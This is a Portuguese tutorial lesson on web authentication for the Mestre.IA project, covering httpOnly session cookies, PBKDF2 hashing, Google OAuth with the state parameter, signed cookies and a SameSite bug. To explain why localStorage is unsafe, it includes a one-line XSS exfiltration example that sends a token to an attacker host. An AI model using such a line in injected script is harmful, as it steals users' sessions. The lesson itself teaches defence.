Lição 09 · Mestre.IA

Sessão, cookie e token — quem guarda o quê

HTTP não lembra de nada entre dois pedidos — cada requisição chega ao servidor como se fosse a primeira vez. Até a Etapa 8, o Mestre.IA vivia dessa amnésia: todo personagem pertencia a um USUARIO_LOCAL_ID = 1 fixo, e a lista de heróis morava no localStorage do navegador. Esta lição é sobre como "lembrar quem é você" de verdade — senha, Google, e sessão — e sobre um bug que só apareceu testando no navegador de verdade, depois de o código parecer correto em todo teste automatizado e em todo curl.

~12 minutos Arquivos: app/services/auth.py · app/routers/auth.py · Frontend/src/lib/api.ts Lição 8 — streaming do servidor ao pixel ↗

Três palavras que se confundem

Sessão é um conceito, não uma coisa: "este pedido pertence à mesma pessoa que fez aquele outro pedido, dez minutos atrás". Token é qualquer string opaca usada como prova de alguma coisa — pode provar "eu sou o usuário 42, autenticado há pouco" (a sessão) ou "este pedido de login com Google veio realmente daqui, não de outro lugar" (o state do OAuth, ver mais abaixo). Cookie é só o mecanismo de transporte: um cabeçalho HTTP que o navegador guarda e reenvia sozinho em todo pedido para o mesmo site, sem o código do front precisar fazer nada.

Por que localStorage era o lugar errado

Antes da Etapa 8, a lista de heróis vivia em localStorage.mestre_ia_saves. Qualquer JavaScript rodando na página tem acesso de leitura e escrita a isso — inclusive script injetado por um ataque de XSS (Cross-Site Scripting: alguém consegue fazer seu próprio JavaScript rodar na página de outra pessoa, por exemplo através de um campo de texto mal sanitizado). Se o Mestre.IA um dia guardasse um token de sessão em localStorage, um XSS bem-sucedido levaria a conta inteira embora — uma linha de fetch(atacante.com, {body: localStorage.getItem('token')}) resolve.

Um cookie httpOnly fecha exatamente essa porta: document.cookie simplesmente não enxerga cookies marcados assim. JavaScript nunca lê, nunca escreve, nunca vaza — só o navegador manda o cookie de volta ao servidor, por fora do alcance de qualquer script.

# app/routers/auth.py — login()/registrar()
response.set_cookie(
    key="sessao",
    value=criar_cookie_sessao(usuario.id),
    max_age=30 * 24 * 60 * 60,
    httponly=True,   # invisível para JavaScript, inclusive XSS
    samesite="lax",  # próxima seção
)

Senha: por que guardar o hash, e por que PBKDF2

Nunca se guarda a senha em texto puro — se o banco vazar (backup mal configurado, injeção de SQL, um funcionário malicioso), quem só tem os hashes não consegue reconstituir a senha original. Mas um hash rápido (SHA-256 puro, por exemplo) não basta para senha, porque humanos escolhem senhas de espaço de busca pequeno — um atacante com o banco vazado consegue testar bilhões de senhas comuns por segundo contra um hash rápido. A defesa é um hash deliberadamente lento, com salt aleatório por usuário (para dois usuários com a mesma senha não terem o mesmo hash, o que revelaria o padrão):

# app/services/auth.py — hash_senha()
_PBKDF2_ITERACOES = 260_000

def hash_senha(senha: str) -> str:
    salt = secrets.token_hex(16)
    derivado = hashlib.pbkdf2_hmac("sha256", senha.encode(), bytes.fromhex(salt), _PBKDF2_ITERACOES)
    return f"pbkdf2_sha256${_PBKDF2_ITERACOES}${salt}${derivado.hex()}"

PBKDF2 (Password-Based Key Derivation Function 2) é o algoritmo aqui — repete o HMAC-SHA256 260 mil vezes de propósito, para cada tentativa de senha custar um tempo mensurável de CPU em vez de nanossegundos. bcrypt e argon2 são as escolhas mais comuns hoje em dia (e o que este projeto teria usado com acesso à rede para instalar uma dependência nova) — a vantagem deles sobre PBKDF2 é impor também um custo de memória, o que encarece ainda mais rodar bilhões de tentativas em hardware paralelo (GPU/ASIC). PBKDF2 continua aprovado pelo NIST e já vem pronto na hashlib da stdlib do Python — funcional, mas vale trocar se um dia isso deixar de ser um obstáculo de rede.

O formato auto-descritivopbkdf2_sha256$260000$<salt>$<hash> guarda o algoritmo e o número de iterações junto com o hash — se um dia as iterações mudarem (hardware fica mais rápido, 260 mil deixa de ser suficiente), hashes antigos continuam verificáveis, e é possível recalcular com o número novo no próximo login bem-sucedido, sem forçar reset de senha em massa. O Django usa exatamente esse padrão.

Login com Google: por que não decodificar o token localmente

O fluxo OAuth do Google (authorization code flow) devolve, entre outras coisas, um id_token — um JWT assinado pelo Google, que tecnicamente já contém o e-mail do usuário. Dá para decodificar e verificar esse JWT localmente, mas isso exige buscar (e cachear, e rotacionar) as chaves públicas do Google, e implementar verificação de assinatura RS256 corretamente — é exatamente o tipo de código onde implementações caseiras de OAuth mais erram.

Este projeto evita esse problema perguntando diretamente ao Google, via uma segunda chamada HTTPS, usando o access_token (não o id_token) que veio junto:

# app/services/auth.py — trocar_code_por_userinfo() (resumido)
resp_token = httpx.post(GOOGLE_TOKEN_URL, data={"code": code, ...})
access_token = resp_token.json()["access_token"]
resp_userinfo = httpx.get(GOOGLE_USERINFO_URL, headers={"Authorization": f"Bearer {access_token}"})
# resp_userinfo.json() já vem com {"sub": ..., "email": ..., "email_verified": ...}

A confiança aqui não vem de verificar uma assinatura criptográfica no seu próprio código — vem do TLS da conexão HTTPS com googleapis.com mesmo: só o Google poderia estar respondendo naquele endereço, então a resposta é confiável. Uma chamada de rede a mais, em troca de não reimplementar verificação de JWT.

O state do OAuth: CSRF por outro nome

Antes de mandar o navegador para o Google, o backend gera um valor aleatório (state) e devolve dois lugares com ele: na própria URL do Google (que o Google devolve intacto no callback) e num cookie httpOnly de 10 minutos. No callback, o backend confere que os dois batem antes de aceitar o login.

Sem isso, um ataque possível: o atacante começa o próprio fluxo OAuth (loga na própria conta Google dele), pega a URL de callback que o Google gerou pra ele (com o code dele dentro) e convence a vítima a abrir essa URL. Se o backend não conferisse state, aceitaria o code do atacante e "logaria" a vítima na conta do atacante — um tipo de ataque chamado login CSRF. Conferir que o cookie (que só quem começou o fluxo neste navegador teria) bate com o state da URL fecha essa porta.

Um cookie "assinado" não é um cookie "criptografado"

O valor do cookie de sessão não é um número de usuário cru — é base64url(payload) + "." + base64url(HMAC-SHA256(payload)). Isso é uma assinatura, não criptografia: qualquer um que abra o DevTools consegue ler o conteúdo (é só base64, decodifica em uma linha). O que a assinatura impede é forjar ou alterar o conteúdo — trocar usuario_id: 42 por usuario_id: 1 exigiria recalcular o HMAC, e isso só é possível com o SESSION_SECRET do servidor, que nunca sai do backend.

A distinção em uma fraseAssinado = "não dá para forjar, mas dá para ler". Criptografado = "não dá para ler". Uma sessão só precisa da primeira propriedade — o navegador de quem é dono do cookie já pode ver o próprio usuario_id mesmo, isso não é segredo.

hmac.compare_digest, não ==, compara a assinatura recebida com a esperada — == em Python para antes na primeira diferença de byte, e o tempo que essa comparação leva vaza informação sobre quantos bytes já bateram (um ataque de timing: medir microssegundos de resposta para adivinhar a assinatura byte a byte). compare_digest sempre compara todos os bytes, no mesmo tempo, não importa onde a primeira diferença esteja. O mesmo `compare_digest` protege a comparação de senha em `verificar_senha`.

O bug que só o navegador de verdade revelou: SameSite

Com o código pronto e todos os testes automatizados verdes, o primeiro teste manual no navegador falhou de um jeito estranho: POST /auth/login respondia 200, com um Set-Cookie visível na aba de rede — mas o próximo GET /auth/eu voltava 401, como se o cookie nunca tivesse existido. Testando a mesma sequência com curl, tudo funcionava perfeitamente.

A causa: o front rodava em http://localhost:5173 e a API em http://127.0.0.1:8000 — dois endereços que apontam para a mesma máquina, mas que o navegador trata como sites diferentes para fins da política SameSite. O algoritmo que decide "isso é o mesmo site?" olha o domínio registrável (a parte que dá para registrar, tipo exemplo.com) — e trata hostname (localhost) e literal de IP (127.0.0.1) como categorias diferentes, mesmo quando um resolve para o outro. Com SameSite=Lax, o cookie era aceito ao ser recebido (o Set-Cookie do 127.0.0.1:8000 é válido para requisições àquele host), mas o navegador se recusava a reenviá-lo numa chamada de fetch/axios cross-site.

Por que `curl` não pegou issocurl guarda e reenvia cookies sem aplicar política nenhuma de SameSite — ele não é um navegador, não tem o conceito de "site" de uma página carregada. Um teste que só usa curl (ou httpx em um teste de backend, sem navegador) nunca teria pego este bug. Só apareceu ao testar no navegador de verdade — o mesmo princípio de "testar ao vivo cedo" que a Etapa 4 já tinha aprendido para chamadas de LLM (ver docs/diario/0005-etapa-4.md) vale igual para autenticação.

A correção foi alinhar os dois lados no mesmo hostname — VITE_API_URL=http://localhost:8000 em vez de 127.0.0.1 (ver Frontend/.env.example). Front e API viram origens diferentes (portas diferentes) mas o mesmo site, e SameSite=Lax permite cookies em requisições assim sem restrição.
